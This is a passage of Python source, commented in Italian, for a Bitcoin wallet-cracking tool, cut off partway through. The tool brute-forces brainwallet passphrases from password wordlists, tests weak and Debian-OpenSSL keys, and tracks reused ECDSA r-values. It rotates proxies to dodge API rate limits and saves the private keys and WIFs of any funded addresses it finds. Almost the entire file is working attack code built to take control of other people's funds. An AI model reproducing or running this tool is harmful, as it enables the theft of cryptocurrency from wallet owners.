import os
import hashlib
import ecdsa
import base58
import requests
import json
import time
import re
import threading
import queue
import concurrent.futures
import random
import sqlite3
from tqdm import tqdm

# Usa mnemonic e hdwallet invece di bip_utils
from mnemonic import Mnemonic
from hdwallet import HDWallet
from hdwallet.symbols import BTC as SYMBOL
from hdwallet.derivations import BIP44Derivation

class UltimateBitcoinWalletCracker:
    def __init__(self):
        self.n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
        self.p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
        self.base_url = "https://blockstream.info/api"
        self.backup_urls = ["https://blockchain.info/rawaddr", "https://api.blockcypher.com/v1/btc/main"]
        self.proxy_list = []  # Aggiungi proxy se necessario
        self.current_proxy_index = 0
        self.proxy_lock = threading.Lock()
        
        self.db_file = "cracked_wallets.db"
        self.setup_database()
        
        # Carica database di chiavi note
        self.known_private_keys = {}
        self.load_known_keys()
        
        # Carica wordlist per brainwallet
        self.wordlist = self.load_wordlist()
        
        # Carica database di pattern di vulnerabilità
        self.r_value_database = self.load_r_value_database()
        
        # Contatori per statistiche
        self.addresses_checked = 0
        self.vulnerabilities_found = 0
        self.stats_lock = threading.Lock()
        
        # Coda per indirizzi con saldo positivo
        self.balance_queue = queue.Queue()
        
        # Avvia thread per il controllo dei saldi
        self.start_balance_checker()
    
    def setup_database(self):
        """Configura il database SQLite per salvare i risultati"""
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        c.execute('''
        CREATE TABLE IF NOT EXISTS cracked_wallets (
            address TEXT PRIMARY KEY,
            private_key TEXT,
            wif TEXT,
            balance REAL,
            vulnerability_type TEXT,
            details TEXT,
            timestamp TEXT
        )
        ''')
        
        # Tabella per memorizzare i dettagli delle vulnerabilità
        c.execute('''
        CREATE TABLE IF NOT EXISTS vulnerability_details (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            address TEXT,
            vulnerability_type TEXT,
            details TEXT,
            discovery_timestamp TEXT,
            exploitation_success INTEGER DEFAULT 0,
            exploitation_details TEXT,
            FOREIGN KEY (address) REFERENCES cracked_wallets(address)
        )
        ''')
        
        # Tabella per memorizzare le statistiche di scansione
        c.execute('''
        CREATE TABLE IF NOT EXISTS scan_stats (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            start_time TEXT,
            end_time TEXT,
            addresses_checked INTEGER,
            vulnerabilities_found INTEGER,
            scan_type TEXT,
            scan_parameters TEXT
        )
        ''')
        
        # Tabella per memorizzare i valori r riutilizzati
        c.execute('''
        CREATE TABLE IF NOT EXISTS r_values (
            r_value TEXT PRIMARY KEY,
            txid1 TEXT,
            txid2 TEXT,
            address TEXT,
            private_key TEXT,
            timestamp TEXT
        )
        ''')
        
        conn.commit()
        conn.close()
    
    def save_cracked_wallet(self, address, private_key, wif, balance, vuln_type, details):
        """Salva un wallet compromesso nel database con tutti i dettagli possibili"""
        try:
            conn = sqlite3.connect(self.db_file)
            c = conn.cursor()
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            
            # Salva i dati principali del wallet
            c.execute("INSERT OR REPLACE INTO cracked_wallets VALUES (?, ?, ?, ?, ?, ?, ?)",
                     (address, private_key, wif, balance, vuln_type, json.dumps(details), timestamp))
            
            # Salva i dettagli della vulnerabilità
            c.execute("INSERT INTO vulnerability_details (address, vulnerability_type, details, discovery_timestamp) VALUES (?, ?, ?, ?)",
                     (address, vuln_type, json.dumps(details), timestamp))
            
            # Se è una vulnerabilità r-value, salva anche nella tabella specifica
            if vuln_type == "r_value_reuse" and "r_value" in details:
                c.execute("INSERT OR REPLACE INTO r_values (r_value, txid1, txid2, address, private_key, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
                         (details["r_value"], details.get("tx1", ""), details.get("tx2", ""), address, private_key if private_key else "", timestamp))
            
            conn.commit()
            conn.close()
            
            # Aggiorna il contatore
            with self.stats_lock:
                self.vulnerabilities_found += 1
                
            # Stampa immediatamente i wallet con saldo positivo
            if balance > 0:
                print(f"[TROVATO WALLET CON SALDO] Indirizzo: {address}, Saldo: {balance} BTC, Chiave privata: {private_key}, WIF: {wif}")
                
                # Salva in un file separato per maggiore sicurezza
                with open("wallets_with_balance.txt", "a") as f:
                    f.write(f"{timestamp} | {address} | {balance} BTC | {private_key} | {wif} | {vuln_type}\n")
        except Exception as e:
            print(f"Errore nel salvataggio del wallet compromesso: {str(e)}")
            # Log dell'errore per debug
            with open("error_log.txt", "a") as f:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Errore nel salvataggio wallet {address}: {str(e)}\n")
    
    def load_known_keys(self):
        """Carica database di chiavi private note da diverse fonti"""
        try:
            # Carica da file JSON principale
            if os.path.exists("known_keys.json"):
                with open("known_keys.json", "r") as f:
                    self.known_private_keys = json.load(f)
                print(f"Caricate {len(self.known_private_keys)} chiavi note da known_keys.json")
            
            # Carica da file di backup o aggiuntivi
            backup_files = ["leaked_keys.json", "weak_keys.json", "compromised_keys.json"]
            for file in backup_files:
                if os.path.exists(file):
                    with open(file, "r") as f:
                        additional_keys = json.load(f)
                        # Unisci i dizionari
                        self.known_private_keys.update(additional_keys)
                    print(f"Caricate chiavi aggiuntive da {file}")
            
            # Carica anche da file di testo semplice (un formato per riga)
            if os.path.exists("keys.txt"):
                with open("keys.txt", "r") as f:
                    for line in f:
                        line = line.strip()
                        if line and ":" in line:
                            parts = line.split(":")
                            if len(parts) >= 2:
                                key = parts[0].strip()
                                info = {"source": parts[1].strip()}
                                self.known_private_keys[key] = info
                print(f"Caricate chiavi da keys.txt, totale chiavi note: {len(self.known_private_keys)}")
            
            # Carica anche le chiavi dal database Debian weak keys (vulnerabilità OpenSSL)
            if os.path.exists("debian_weak_keys.txt"):
                with open("debian_weak_keys.txt", "r") as f:
                    for line in f:
                        key = line.strip()
                        if key:
                            self.known_private_keys[key] = {"source": "debian_openssl_vulnerability"}
                print(f"Caricate chiavi dalla vulnerabilità Debian OpenSSL, totale: {len(self.known_private_keys)}")
            
        except Exception as e:
            print(f"Errore nel caricamento delle chiavi note: {str(e)}")
            # Inizializza con un dizionario vuoto in caso di errore
            self.known_private_keys = {}
            
            # Aggiungi alcune chiavi note come fallback
            self.known_private_keys["0000000000000000000000000000000000000000000000000000000000000001"] = {"source": "test_key_1"}
            self.known_private_keys["0000000000000000000000000000000000000000000000000000000000000002"] = {"source": "test_key_2"}
            self.known_private_keys["0000000000000000000000000000000000000000000000000000000000000003"] = {"source": "test_key_3"}
            
            print("Database di chiavi note non trovato o corrotto. Utilizzando chiavi di test.")
    
    def load_wordlist(self):
        """Carica una wordlist completa per attacchi brainwallet da multiple fonti"""
        wordlist = []
        
        try:
            # Lista di possibili file wordlist in ordine di preferenza
            wordlist_files = [
                "rockyou.txt",
                "common_passwords.txt", 
                "english_words.txt",
                "bitcoin_brainwallet_words.txt",
                "top_100k_passwords.txt",
                "/usr/share/dict/words",
                "/usr/share/wordlists/rockyou.txt"
            ]
            
            # Prova a caricare le wordlist esistenti
            loaded_any = False
            for file in wordlist_files:
                if os.path.exists(file):
                    print(f"Caricamento wordlist da {file}...")
                    encoding = "utf-8" if "english" in file or "dict" in file else "latin-1"
                    
                    with open(file, "r", encoding=encoding, errors="ignore") as f:
                        file_words = [line.strip() for line in f if len(line.strip()) >= 4]  # Ignora parole troppo corte
                        wordlist.extend(file_words)
                        print(f"Caricate {len(file_words)} parole da {file}")
                        loaded_any = True
            
            # Aggiungi frasi comuni per brainwallet
            common_phrases = [
                "correct horse battery staple", "bitcoin is awesome", "satoshi nakamoto",
                "to be or not to be", "all your base are belong to us", "password123",
                "trustno1", "hunter2", "letmein", "qwerty", "123456", "iloveyou",
                "blockchain", "cryptocurrency", "hodl", "to the moon", "buy bitcoin",
                "bitcoin to the moon", "vires in numeris", "digital gold", "magic internet money",
                "not your keys not your coins", "private key", "public key", "satoshi",
                "nakamoto", "hal finney", "nick szabo", "wei dai", "adam back", "bitcoin whitepaper",
                "genesis block", "block reward", "proof of work", "difficulty adjustment",
                "decentralized", "censorship resistant", "peer to peer", "p2p", "cryptography",
                "sha256", "ripemd160", "elliptic curve", "secp256k1", "double spending",
                "21 million", "halving", "wallet", "address", "transaction", "mempool",
                "unconfirmed", "confirmation", "block height", "merkle tree", "merkle root"
            ]
            wordlist.extend(common_phrases)
            
            # Aggiungi date importanti formattate in vari modi
            important_dates = [
                "03012009", "03-01-2009", "03/01/2009",  # Genesis block
                "31102008", "31-10-2008", "31/10/2008",  # Bitcoin whitepaper
                "15052010", "15-05-2010", "15/05/2010",  # Prima transazione Bitcoin per pizza
                "28112012", "28-11-2012", "28/11/2012",  # Primo halving
                "09072016", "09-07-2016", "09/07/2016",  # Secondo halving
                "11052020", "11-05-2020", "11/05/2020"   # Terzo halving
            ]
            wordlist.extend(important_dates)
            
            # Aggiungi combinazioni di parole comuni con numeri
            base_words = ["bitcoin", "satoshi", "wallet", "crypto", "blockchain", "password", "secret"]
            for word in base_words:
                for i in range(100):
                    wordlist.append(f"{word}{i}")
                    wordlist.append(f"{word}{i}!")
                    wordlist.append(f"{word}_{i}")
                    wordlist.append(f"{i}{word}")
            
            # Aggiungi parole con sostituzioni comuni (leet speak)
            leet_replacements = {
                'a': '4', 'e': '3', 'i': '1', 'o': '0', 
                's': '5', 't': '7', 'b': '8', 'l': '1'
            }
            
            leet_base_words = ["password", "bitcoin", "satoshi", "secret", "private", "wallet", "blockchain"]
            for word in leet_base_words:
                # Genera tutte le possibili combinazioni di sostituzione leet
                wordlist.append(word)  # Originale
                
                # Versione con tutte le sostituzioni
                leet_word = ''.join(leet_replacements.get(c, c) for c in word)
                wordlist.append(leet_word)
                
                # Versioni con singole sostituzioni
                for i, c in enumerate(word):
                    if c in leet_replacements:
                        leet_char = leet_replacements[c]
                        wordlist.append(word[:i] + leet_char + word[i+1:])
            
            # Se non è stato caricato nessun file, usa un set minimo di parole
            if not loaded_any:
                print("Nessun file wordlist trovato. Utilizzo wordlist minima.")
                min_words = ["password", "123456", "qwerty", "bitcoin", "satoshi", "blockchain", 
                            "crypto", "wallet", "private", "secret", "nakamoto", "genesis", 
                            "block", "transaction", "address", "miner", "mining", "reward",
                            "halving", "difficulty", "hash", "sha256", "ripemd", "secp256k1"]
                wordlist.extend(min_words)
            
            # Rimuovi duplicati preservando l'ordine
            wordlist = list(dict.fromkeys(wordlist))
            
            print(f"Caricata wordlist con {len(wordlist)} parole uniche")
            
            # Salva la wordlist combinata per uso futuro
            with open("combined_wordlist.txt", "w", encoding="utf-8") as f:
                for word in wordlist:
                    f.write(word + "\n")
            
        except Exception as e:
            print(f"Errore nel caricamento della wordlist: {str(e)}")
            # Fallback a una wordlist minima
            wordlist = ["password", "123456", "qwerty", "bitcoin", "satoshi", "nakamoto", 
                        "blockchain", "private", "wallet", "crypto", "secret"]
            print("Utilizzando wordlist minima di fallback")
        
        return wordlist
    
    def load_r_value_database(self):
        """Carica database completo di valori r noti con vulnerabilità"""
        r_values = {}
        try:
            # Carica da file JSON principale
            if os.path.exists("r_values.json"):
                with open("r_values.json", "r") as f:
                    r_values = json.load(f)
                print(f"Caricati {len(r_values)} valori r noti dal file principale")
            
            # Carica anche dal database SQLite se esiste
            conn = sqlite3.connect(self.db_file)
            c = conn.cursor()
            c.execute("SELECT r_value, txid1, txid2, address, private_key FROM r_values")
            rows = c.fetchall()
            conn.close()
            
            for row in rows:
                r_value, txid1, txid2, address, private_key = row
                if r_value not in r_values:
                    r_values[r_value] = {
                        "txid1": txid1,
                        "txid2": txid2,
                        "address": address,
                        "private_key": private_key
                    }
            
            print(f"Caricati in totale {len(r_values)} valori r noti")
            
            # Carica anche valori r noti da ricerche accademiche
            if os.path.exists("known_vulnerable_r_values.txt"):
                with open("known_vulnerable_r_values.txt", "r") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            parts = line.split(",")
                            if len(parts) >= 1:
                                r_value = parts[0].strip()
                                if r_value not in r_values:
                                    r_values[r_value] = {"source": "academic_research"}
                print(f"Caricati valori r da ricerche accademiche, totale: {len(r_values)}")
        
        except Exception as e:
            print(f"Errore nel caricamento del database di valori r: {str(e)}")
        
        # Se il database è vuoto, aggiungi alcuni valori di test
        if not r_values:
            print("Database di valori r non trovato o vuoto. Inizializzazione con valori di test.")
            # Questi sono solo valori di esempio e non rappresentano vulnerabilità reali
            test_values = [
                "00000000000000000000000000000000000000000000000000000000deadbeef",
                "00000000000000000000000000000000000000000000000000000000baddcafe",
                "00000000000000000000000000000000000000000000000000000000face0123"
            ]
            for val in test_values:
                r_values[val] = {"source": "test_value"}
        
        return r_values
    
    def get_proxy(self):
        """Restituisce il prossimo proxy dalla lista con gestione avanzata"""
        if not self.proxy_list:
            return None
            
        with self.proxy_lock:
            # Seleziona il prossimo proxy
            proxy = self.proxy_list[self.current_proxy_index]
            
            # Aggiorna l'indice per il prossimo utilizzo
            self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_list)
            
            # Verifica se il proxy è nel formato corretto
            if not proxy.startswith('http'):
                # Aggiungi il prefisso HTTP se mancante
                proxy = f"http://{proxy}"
            
        return proxy
    
    def load_proxies(self, file_path=None):
        """Carica una lista di proxy da un file o da fonti online"""
        self.proxy_list = []
        
        try:
            # Carica da file locale se specificato
            if file_path and os.path.exists(file_path):
                with open(file_path, "r") as f:
                    for line in f:
                        proxy = line.strip()
                        if proxy:
                            self.proxy_list.append(proxy)
                print(f"Caricati {len(self.proxy_list)} proxy da {file_path}")
            
            # Se non ci sono proxy o il file non esiste, prova a caricare da fonti online
            if not self.proxy_list:
                # Fonti di proxy gratuiti (esempio)
                proxy_sources = [
                    "https://www.proxy-list.download/api/v1/get?type=http",
                    "https://api.proxyscrape.com/?request=getproxies&proxytype=http"
                ]
                
                for source in proxy_sources:
                    try:
                        response = requests.get(source, timeout=10)
                        if response.status_code == 200:
                            proxies = response.text.strip().split("\r\n")
                            self.proxy_list.extend([p for p in proxies if p])
                    except:
                        continue
                
                print(f"Caricati {len(self.proxy_list)} proxy da fonti online")
            
            # Rimuovi duplicati
            self.proxy_list = list(set(self.proxy_list))
            
            # Verifica i proxy funzionanti (opzionale, può richiedere tempo)
            if self.proxy_list and len(self.proxy_list) > 10:
                print("Verifica dei proxy in corso...")
                working_proxies = []
                
                for proxy in tqdm(self.proxy_list[:20]):  # Verifica solo i primi 20 per velocità
                    try:
                        proxies = {"http": proxy, "https": proxy}
                        response = requests.get("https://api.ipify.org", proxies=proxies, timeout=5)
                        if response.status_code == 200:
                            working_proxies.append(proxy)
                    except:
                        continue
                
                if working_proxies:
                    self.proxy_list = working_proxies
                    print(f"Trovati {len(self.proxy_list)} proxy funzionanti")
                else:
                    print("Nessun proxy funzionante trovato. Utilizzo connessione diretta.")
            
        except Exception as e:
            print(f"Errore nel caricamento dei proxy: {str(e)}")
            self.proxy_list = []
    
    def make_request(self, url, params=None, max_retries=5, use_proxy=True, timeout=15):
        """Effettua una richiesta HTTP con gestione avanzata dei proxy, retry e fallback"""
        retries = 0
        backoff_factor = 2  # Per backoff esponenziale
        
        while retries < max_retries:
            try:
                headers = {
                    'User-Agent': f'Bitcoin-Research-Tool/{random.randint(1000, 9999)}',
                    'Accept': 'application/json'
                }
                
                proxies = None
                if use_proxy and self.proxy_list:
                    proxy = self.get_proxy()
                    if proxy:
                        proxies = {"http": proxy, "https": proxy}
                
                # Aggiungi un piccolo jitter casuale per evitare pattern di richieste
                if retries > 0:
                    jitter = random.uniform(0.1, 0.5)
                    time.sleep(backoff_factor ** retries + jitter)
                
                response = requests.get(
                    url, 
                    params=params, 
                    proxies=proxies, 
                    headers=headers,
                    timeout=timeout
                )
                
                if response.status_code == 200:
                    # Se la risposta è valida, restituisci i dati JSON
                    return response.json()
                elif response.status_code == 429:  # Rate limit
                    print(f"Rate limit raggiunto. Attesa prima del retry ({retries+1}/{max_retries})...")
                    retries += 1
                    # Backoff esponenziale con jitter
                    delay = (backoff_factor ** retries) + random.uniform(0.1, 1.0)
                    time.sleep(delay)
                elif response.status_code in [403, 401]:  # Accesso negato o non autorizzato
                    # Prova senza proxy se stavamo usando un proxy
                    if proxies:
                        print("Accesso negato con proxy. Tentativo senza proxy...")
                        proxies = None
                        retries += 1
                    else:
                        # Se già stiamo provando senza proxy, passa al prossimo tentativo
                        retries += 1
                else:
                    # Altri errori HTTP
                    print(f"Errore HTTP {response.status_code}. Retry {retries+1}/{max_retries}...")
                    retries += 1
            except requests.exceptions.Timeout:
                print(f"Timeout della richiesta. Retry {retries+1}/{max_retries}...")
                retries += 1
                # Aumenta il timeout per il prossimo tentativo
                timeout += 5
            except requests.exceptions.ConnectionError:
                print(f"Errore di connessione. Retry {retries+1}/{max_retries}...")
                retries += 1
                # Prova senza proxy al prossimo tentativo
                use_proxy = False
            except Exception as e:
                print(f"Errore durante la richiesta: {str(e)}. Retry {retries+1}/{max_retries}...")
                retries += 1
        
        print(f"Tutti i tentativi falliti per URL: {url}")
        return None
    
    def get_address_balance(self, address):
        """Ottiene il saldo di un indirizzo Bitcoin con supporto multi-API e caching"""
        # Verifica se l'indirizzo è già nella cache
        cache_file = "balance_cache.json"
        cache = {}
        
        # Carica la cache se esiste
        if os.path.exists(cache_file):
            try:
                with open(cache_file, "r") as f:
                    cache = json.load(f)
                    
                # Verifica se l'indirizzo è nella cache e se è recente (meno di 1 ora)
                if address in cache:
                    cached_time = cache[address]["timestamp"]
                    if time.time() - cached_time < 3600:  # 1 ora in secondi
                        return cache[address]["balance"]
            except:
                # Se c'è un errore nel caricamento della cache, continua senza
                pass
        
        try:
            # Prova prima l'API principale
            url = f"{self.base_url}/address/{address}"
            data = self.make_request(url)
            
            if data and "chain_stats" in data:
                funded = data["chain_stats"].get("funded_txo_sum", 0)
                spent = data["chain_stats"].get("spent_txo_sum", 0)
                balance = (funded - spent) / 100000000  # Converti satoshi in BTC
                
                # Aggiorna la cache
                cache[address] = {"balance": balance, "timestamp": time.time()}
                with open(cache_file, "w") as f:
                    json.dump(cache, f)
                    
                return balance
            
            # Se fallisce, prova API alternative
            for backup_url in self.backup_urls:
                try:
                    if "blockchain.info" in backup_url:
                        url = f"{backup_url}/{address}?limit=0"
                        data = self.make_request(url)
                        if data and "final_balance" in data:
                            balance = data["final_balance"] / 100000000
                            
                            # Aggiorna la cache
                            cache[address] = {"balance": balance, "timestamp": time.time()}
                            with open(cache_file, "w") as f:
                                json.dump(cache, f)
                                
                            return balance
                    elif "blockcypher" in backup_url:
                        url = f"{backup_url}/addrs/{address}/balance"
                        data = self.make_request(url)
                        if data and "final_balance" in data:
                            balance = data["final_balance"] / 100000000
                            
                            # Aggiorna la cache
                            cache[address] = {"balance": balance, "timestamp": time.time()}
                            with open(cache_file, "w") as f:
                                json.dump(cache, f)
                                
                            return balance
                except Exception as e:
                    print(f"Errore con API di backup {backup_url}: {str(e)}")
                    continue
            
            # Prova anche con API mempool.space come ultima risorsa
            try:
                url = f"https://mempool.space/api/address/{address}"
                data = self.make_request(url)
                if data and "chain_stats" in data:
                    funded = data["chain_stats"].get("funded_txo_sum", 0)
                    spent = data["chain_stats"].get("spent_txo_sum", 0)
                    balance = (funded - spent) / 100000000
                    
                    # Aggiorna la cache
                    cache[address] = {"balance": balance, "timestamp": time.time()}
                    with open(cache_file, "w") as f:
                        json.dump(cache, f)
                        
                    return balance
            except:
                pass
            
            # Se tutte le API falliscono, aggiorna comunque la cache con saldo zero
            cache[address] = {"balance": 0, "timestamp": time.time()}
            with open(cache_file, "w") as f:
                json.dump(cache, f)
                
            return 0
        except Exception as e:
            print(f"Errore nel controllo del saldo per {address}: {str(e)}")
            return 0
    
    def start_balance_checker(self):
        """Avvia un pool di thread separati per controllare i saldi degli indirizzi in modo efficiente"""
        def checker():
            while True:
                try:
                    # Ottieni il prossimo indirizzo dalla coda
                    address, private_key, wif, vuln_type, details = self.balance_queue.get()
                    
                    # Controlla il saldo
                    balance = self.get_address_balance(address)
                    
                    # Salva nel database
                    self.save_cracked_wallet(address, private_key, wif, balance, vuln_type, details)
                    
                    # Attendi per evitare rate limit
                    time.sleep(random.uniform(0.5, 2.0))
                    
                    self.balance_queue.task_done()
                except Exception as e:
                    print(f"Errore nel thread checker: {str(e)}")
                    time.sleep(1)
        
        # Avvia multipli thread per il controllo del saldo
        num_threads = min(10, os.cpu_count() or 4)
        for _ in range(num_threads):
            threading.Thread(target=checker, daemon=True).start()
        
        print(f"Avviati {num_threads} thread per il controllo dei saldi")
    
    def private_key_to_address(self, private_key_int, compressed=True):
        """Converte una chiave privata in un indirizzo Bitcoin con implementazione completa"""
        try:
            # Verifica che la chiave privata sia nell'intervallo valido
            if not 1 <= private_key_int < self.n:
                raise ValueError("Chiave privata non valida: deve essere tra 1 e n-1")
            
            # Converti l'intero in bytes
            private_key_bytes = private_key_int.to_bytes(32, byteorder='big')
            
            # Genera la chiave pubblica usando la curva ellittica secp256k1
            signing_key = ecdsa.SigningKey.from_string(private_key_bytes, curve=ecdsa.SECP256k1)
            verifying_key = signing_key.get_verifying_key()
            
            # Ottieni le coordinate x e y della chiave pubblica
            x = verifying_key.pubkey.point.x()
            y = verifying_key.pubkey.point.y()
            
            # Formato compresso o non compresso
            if compressed:
                # Nel formato compresso, usiamo 0x02 se y è pari, 0x03 se y è dispari
                prefix = b'\x02' if y % 2 == 0 else b'\x03'
                public_key = prefix + x.to_bytes(32, byteorder='big')
            else:
                # Nel formato non compresso, usiamo 0x04 seguito da entrambe le coordinate
                public_key = b'\x04' + x.to_bytes(32, byteorder='big') + y.to_bytes(32, byteorder='big')
            
            # Step 1: SHA-256 hash della chiave pubblica
            sha256_hash = hashlib.sha256(public_key).digest()
            
            # Step 2: RIPEMD-160 hash del risultato
            ripemd160 = hashlib.new('ripemd160')
            ripemd160.update(sha256_hash)
            hash160 = ripemd160.digest()
            
            # Step 3: Aggiungi byte di versione (0x00 per mainnet, 0x6f per testnet)
            versioned_hash = b'\x00' + hash160
            
            # Step 4: Calcola il checksum (doppio SHA-256 dei primi 21 byte)
            checksum_full = hashlib.sha256(hashlib.sha256(versioned_hash).digest()).digest()
            checksum = checksum_full[:4]  # Primi 4 byte
            
            # Step 5: Combina versione, hash160 e checksum
            address_bytes = versioned_hash + checksum
            
            # Step 6: Codifica in Base58
            address = base58.b58encode(address_bytes).decode('utf-8')
            
            return address
        except Exception as e:
            print(f"Errore nella conversione della chiave privata in indirizzo: {str(e)}")
            return None
    
    def private_key_to_wif(self, private_key_int, compressed=True):
        """Converte una chiave privata in formato WIF (Wallet Import Format) con implementazione completa"""
        try:
            # Verifica che la chiave privata sia nell'intervallo valido
            if not 1 <= private_key_int < self.n:
                raise ValueError("Chiave privata non valida: deve essere tra 1 e n-1")
            
            # Converti l'intero in bytes
            private_key_bytes = private_key_int.to_bytes(32, byteorder='big')
            
            # Step 1: Aggiungi byte di versione (0x80 per mainnet)
            versioned_key = b'\x80' + private_key_bytes
            
            # Step 2: Aggiungi flag di compressione se necessario
            if compressed:
                versioned_key += b'\x01'
            
            # Step 3: Calcola il checksum (doppio SHA-256)
            checksum_full = hashlib.sha256(hashlib.sha256(versioned_key).digest()).digest()
            checksum = checksum_full[:4]  # Primi 4 byte
            
            # Step 4: Combina versione, chiave privata, flag di compressione e checksum
            wif_bytes = versioned_key + checksum
            
            # Step 5: Codifica in Base58
            wif = base58.b58encode(wif_bytes).decode('utf-8')
            
            return wif
        except Exception as e:
            print(f"Errore nella conversione della chiave privata in WIF: {str(e)}")
            return None
    
    def wif_to_private_key(self, wif):
        """Converte una chiave WIF in chiave privata (intero)"""
        try:
            # Decodifica Base58
            decoded = base58.b58decode(wif)
            
            # Verifica la lunghezza
            if len(decoded) not in [37, 38]:  # 37 per non compresso, 38 per compresso
                raise ValueError("Lunghezza WIF non valida")
            
            # Estrai i componenti
            version = decoded[0]
            if version != 0x80:  # 0x80 per mainnet
                raise ValueError(f"Versione WIF non valida: {version}")
            
            # Verifica il checksum
            checksum = decoded[-4:]
            payload = decoded[:-4]
            calculated_checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
            
            if checksum != calculated_checksum:
                raise ValueError("Checksum WIF non valido")
            
            # Determina se è compresso
            is_compressed = (len(decoded) == 38)
            
            # Estrai la chiave privata
            if is_compressed:
                private_key_bytes = decoded[1:-5]  # Escludi versione, flag di compressione e checksum
            else:
                private_key_bytes = decoded[1:-4]  # Escludi versione e checksum
            
            # Converti in intero
            private_key_int = int.from_bytes(private_key_bytes, byteorder='big')
            
            return private_key_int, is_compressed
        except Exception as e:
            print(f"Errore nella conversione WIF in chiave privata: {str(e)}")
            return None, None
    
    def address_to_script_hash(self, address):
        """Converte un indirizzo Bitcoin in script hash per query a electrum servers"""
        try:
            # Decodifica l'indirizzo
            address_bytes = base58.b58decode(address)
            
            # Estrai il payload (escludi versione e checksum)
            payload = address_bytes[1:-4]
            
            # Crea lo script P2PKH: OP_DUP OP_HASH160 <pubKeyHash> OP_EQUALVERIFY OP_CHECKSIG
            script = b'\x76\xa9\x14' + payload + b'\x88\xac'
            
            # Calcola SHA-256 dello script
            script_hash = hashlib.sha256(script).digest()
            
            # Inverti l'ordine dei byte (little-endian)
            script_hash = script_hash[::-1]
            
            # Converti in hex
            script_hash_hex = script_hash.hex()
            
            return script_hash_hex
        except Exception as e:
            print(f"Errore nella conversione dell'indirizzo in script hash: {str(e)}")
            return None
    
    def check_brainwallet(self, address):
        """Verifica se un indirizzo è un brain wallet con frase comune usando implementazione completa"""
        for phrase in self.wordlist:
            try:
                # Genera la chiave privata dalla frase con SHA-256
                private_key_bytes = hashlib.sha256(phrase.encode('utf-8')).digest()
                private_key_int = int.from_bytes(private_key_bytes, byteorder='big')
                
                # Verifica che la chiave sia nell'intervallo valido
                if not 1 <= private_key_int < self.n:
                    continue
                
                # Genera indirizzi (compresso e non compresso)
                address_uncompressed = self.private_key_to_address(private_key_int, compressed=False)
                address_compressed = self.private_key_to_address(private_key_int, compressed=True)
                
                # Controlla se corrispondono
                if address == address_compressed or address == address_uncompressed:
                    is_compressed = (address == address_compressed)
                    wif = self.private_key_to_wif(private_key_int, compressed=is_compressed)
                    
                    details = {
                        "brain_wallet_phrase": phrase,
                        "method": "sha256",
                        "is_compressed": is_compressed
                    }
                    
                    # Aggiungi alla coda per il controllo del saldo
                    self.balance_queue.put((address, hex(private_key_int), wif, "brain_wallet", details))
                    return True
                
                # Prova anche con doppio SHA-256 (alcune implementazioni lo usano)
                double_sha256 = hashlib.sha256(private_key_bytes).digest()
                private_key_int_double = int.from_bytes(double_sha256, byteorder='big')
                
                if not 1 <= private_key_int_double < self.n:
                    continue
                    
                address_uncompressed_double = self.private_key_to_address(private_key_int_double, compressed=False)
                address_compressed_double = self.private_key_to_address(private_key_int_double, compressed=True)
                
                if address == address_compressed_double or address == address_uncompressed_double:
                    is_compressed = (address == address_compressed_double)
                    wif = self.private_key_to_wif(private_key_int_double, compressed=is_compressed)
                    
                    details = {
                        "brain_wallet_phrase": phrase,
                        "method": "double_sha256",
                        "is_compressed": is_compressed
                    }
                    
                    # Aggiungi alla coda per il controllo del saldo
                    self.balance_queue.put((address, hex(private_key_int_double), wif, "brain_wallet_double_sha256", details))
                    return True
                
                # Prova anche con SHA-512 troncato a 32 byte (alcune implementazioni lo usano)
                sha512 = hashlib.sha512(phrase.encode('utf-8')).digest()[:32]
                private_key_int_512 = int.from_bytes(sha512, byteorder='big')
                
                if not 1 <= private_key_int_512 < self.n:
                    continue
                
                address_uncompressed_512 = self.private_key_to_address(private_key_int_512, compressed=False)
                address_compressed_512 = self.private_key_to_address(private_key_int_512, compressed=True)
                
                if address == address_compressed_512 or address == address_uncompressed_512:
                    is_compressed = (address == address_compressed_512)
                    wif = self.private_key_to_wif(private_key_int_512, compressed=is_compressed)
                    
                    details = {
                        "brain_wallet_phrase": phrase,
                        "method": "sha512_truncated",
                        "is_compressed": is_compressed
                    }
                    
                    # Aggiungi alla coda per il controllo del saldo
                    self.balance_queue.put((address, hex(private_key_int_512), wif, "brain_wallet_sha512", details))
                    return True
                
            except Exception as e:
                # Continua con la prossima frase in caso di errore
                continue
        
        return False
    
    def check_weak_keys(self, address):
        """Verifica chiavi deboli comuni con implementazione completa"""
        # Lista estesa di pattern di chiavi deboli da testare
        weak_patterns = [
            "0" * 64,                      # Tutti zero
            "1" * 64,                      # Tutti uno
            "f" * 64,                      # Tutti F
            "0123456789abcdef" * 4,        # Pattern ripetuto
            "00000000000000000000000000000001",  # Uno
            "00000000000000000000000000000002",  # Due
            "00000000000000000000000000000003",  # Tre
            "0000000000000000000000000000000a",  # Dieci
            "123456789abcdef0" * 4,        # Pattern ripetuto 2
            "abcdef0123456789" * 4,        # Pattern ripetuto 3
            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",  # Max
            "fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364140",  # N-1
            "0000000000000000000000000000000000000000000000000000000000000000",  # Zero (invalido ma testato)
        ]
        
        # Aggiungi chiavi consecutive
        for i in range(1, 21):
            weak_patterns.append(hex(i)[2:].zfill(64))
        
        # Aggiungi chiavi con pattern ripetuti
        for pattern in ["00", "01", "10", "ff", "deadbeef", "cafebabe", "12345678"]:
            repeat_count = 64 // len(pattern)
            weak_patterns.append(pattern * repeat_count)
        
        # Aggiungi chiavi basate su timestamp comuni
        unix_timestamps = [
            1231006505,  # Genesis block
            1293840000,  # 1 Jan 2011
            1325376000,  # 1 Jan 2012
            1356998400,  # 1 Jan 2013
            1388534400,  # 1 Jan 2014
            1420070400,  # 1 Jan 2015
            1451606400,  # 1 Jan 2016
